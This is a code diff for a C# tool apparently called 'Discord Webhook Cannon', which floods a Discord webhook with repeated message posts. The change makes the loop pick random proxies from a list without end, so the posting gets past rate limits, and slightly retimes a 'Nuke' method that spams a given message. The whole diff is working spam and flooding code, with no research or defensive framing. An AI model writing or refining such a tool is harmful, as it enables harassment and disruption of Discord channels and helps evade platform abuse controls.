@@ -49,27 +49,29 @@ namespace Discord_Webhook_Cannon
             string proxyUsername = "";
             string proxyPassword = "";
 
-            foreach (string line in File.ReadAllLines(proxylist))
+            while(true)
             {
+                var lines = File.ReadAllLines(proxylist);
+                var r = new Random();
+                var randomLineNumber = r.Next(0, lines.Length - 1);
+                var line = lines[randomLineNumber];
+
                 i++;
                 Console.WriteLine("Req nr: " + i + " " + line);
                 WebProxy proxy1 = new WebProxy("http://" + line);
 
                 try
                 {
-                    while (true)
+                    for (int j = 1; j <= Int32.Parse(time); j++)
                     {
-                        for (int j = 1; j <= Int32.Parse(time); j++)
-                        {
-                            Thread.Sleep(500);
-                            proxy1.Credentials = new NetworkCredential(proxyUsername, proxyPassword);
-                            dWebClient.Proxy = proxy1;
-                            dWebClient.UploadValues(webhook, discord);
-                            dWebClient.UploadValues(botName, discord);
-                            dWebClient.UploadValues(avatarUrl, discord);
-                        }
-                        Thread.Sleep(10000);
+                        Thread.Sleep(600);
+                        proxy1.Credentials = new NetworkCredential(proxyUsername, proxyPassword);
+                        dWebClient.Proxy = proxy1;
+                        dWebClient.UploadValues(webhook, discord);
+                        dWebClient.UploadValues(botName, discord);
+                        dWebClient.UploadValues(avatarUrl, discord);
                     }
+                    Thread.Sleep(10000);
                 }
                 catch (Exception ex)
                 {
@@ -77,6 +79,7 @@ namespace Discord_Webhook_Cannon
                     continue;
                 }
             }
+        
         }
         public void Nuke(string webhook, string message,string avatarUrl,string botName, string time)
         {
@@ -89,7 +92,7 @@ namespace Discord_Webhook_Cannon
                 {
                     for (int j = 1; j <= Int32.Parse(time); j++)
                     {
-                        Thread.Sleep(500);
+                        Thread.Sleep(600);
                         dWebClient.UploadValues(webhook, discord);
                         //dWebClient.UploadValues(botName, discord);
                         //dWebClient.UploadValues(avatarUrl, discord);
@@ -113,6 +116,5 @@ namespace Discord_Webhook_Cannon
             discord.Add("avatar_url", avatarUrl);
             discord.Add("username", botName);
         }
-
     }
 }
